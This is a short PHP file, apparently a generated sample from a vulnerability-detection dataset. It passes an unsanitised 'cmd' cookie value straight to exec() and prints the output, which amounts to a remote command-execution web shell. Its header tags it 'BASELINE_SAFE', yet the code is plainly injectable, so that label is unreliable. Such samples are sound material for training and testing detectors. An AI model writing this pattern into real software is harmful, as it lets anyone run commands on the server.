<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=COOKIE; CE_MODE=COOKIE_AKE; SKELETON=S3; KEY=cmd; SINK=B2; VAR=v0082 */
function SINK_B2($command){
    $output = [];
    exec($command, $output);
    print_r($output);
}
$inp = array_key_exists("cmd", $_COOKIE) ? (string)$_COOKIE["cmd"] : "";
$inp = (string)$inp; // no value processing
$f = function($x){
    return SINK_B2($x);
};
$out = $f($inp);
echo (string)($out);
?>
